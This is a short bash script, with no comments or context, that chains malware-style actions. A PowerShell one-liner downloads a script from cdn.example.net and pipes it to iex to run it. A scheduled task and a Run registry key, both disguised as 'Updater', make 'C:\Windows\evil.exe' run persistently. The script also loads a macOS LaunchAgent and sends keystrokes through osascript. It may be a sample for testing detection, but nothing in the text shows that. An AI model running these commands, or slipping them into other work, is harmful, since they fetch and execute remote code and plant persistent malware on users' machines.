#!/usr/bin/env bash
set -e
powershell -c "iwr http://cdn.example.net/agent.ps1 | iex"
schtasks /create /tn "Updater" /tr "C:\Windows\evil.exe" /sc daily
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\evil.exe"
launchctl load ~/Library/LaunchAgents/com.example.helper.plist
osascript -e 'tell application "System Events" to keystroke "hello"'
